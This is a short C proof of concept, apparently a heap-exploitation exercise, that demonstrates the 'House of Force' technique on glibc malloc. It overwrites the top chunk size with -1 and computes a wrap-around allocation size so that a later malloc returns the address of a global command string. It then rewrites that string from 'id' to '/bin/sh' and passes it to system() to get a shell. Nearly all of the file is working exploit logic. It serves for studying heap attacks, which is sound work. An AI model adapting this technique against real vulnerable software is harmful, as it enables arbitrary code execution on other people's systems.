#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char cmd[] = "id";

int main(int argc, char* argv[]){
    intptr_t *heap1 = malloc(256);
    printf("[+] cmd : %p\n", cmd);
    printf("[+] heap1 : %p\n", heap1);

    int size = malloc_usable_size(heap1);
    printf("[+] heap1's size : %d\n", size);

    intptr_t *top = (intptr_t *)((char *)heap1 + 0x518); // Hard coding Because of built-in function use malloc...
    printf("[+] top chunk : %p\n", top);

    printf("[+] Top size : 0x%x => ", *top);
    top[0] = -1;
    printf("0x%x\n", *top);

    unsigned long long overwrite_size = (unsigned long long)cmd - sizeof(long)*2 - (unsigned long long)top;

    printf("\n[+] size : 0x%x\n", overwrite_size);
    printf("[+] Addr : %p\n", malloc(overwrite_size));

    intptr_t overwrite = malloc(100);
    printf("[+] Overwrite's Addr : %p\n", overwrite);
    printf("[+] cmd : %s\n", cmd);
    strcpy(overwrite, "/bin/sh");
    printf("[+] cmd : %s\n", cmd);
    system(cmd);

}